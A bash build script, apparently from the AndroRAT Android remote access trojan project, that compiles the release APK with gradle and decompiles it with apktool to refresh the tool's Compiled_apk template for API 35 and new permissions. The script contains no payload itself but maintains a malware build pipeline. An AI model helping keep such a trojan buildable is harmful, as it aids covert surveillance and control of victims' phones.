#!/usr/bin/env bash
# Rebuild Compiled_apk/ from Android_Code so hub/apktool builds match API 35 + new permissions.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CODE="$ROOT/Android_Code"
OUT="$ROOT/Compiled_apk"
APKTOOL="${ROOT}/Jar_utils/apktool.jar"

if [[ ! -f "$APKTOOL" ]]; then
  echo "Missing $APKTOOL — place apktool.jar in AndroRAT/Jar_utils/"
  exit 1
fi

cd "$CODE"
chmod +x ./gradlew 2>/dev/null || true
if [[ -z "${ANDROID_HOME:-}" && -d "$HOME/Android/Sdk" ]]; then
  export ANDROID_HOME="$HOME/Android/Sdk"
fi
if [[ ! -f local.properties && -n "${ANDROID_HOME:-}" ]]; then
  echo "sdk.dir=${ANDROID_HOME}" > local.properties
fi
./gradlew assembleRelease
APK="$(find app/build/outputs/apk/release -name '*.apk' | head -1)"
if [[ -z "$APK" ]]; then
  echo "Release APK not found after gradle build"
  exit 1
fi

rm -rf "$OUT"
java -jar "$APKTOOL" d -f "$APK" -o "$OUT"
echo "Compiled_apk refreshed from $APK"
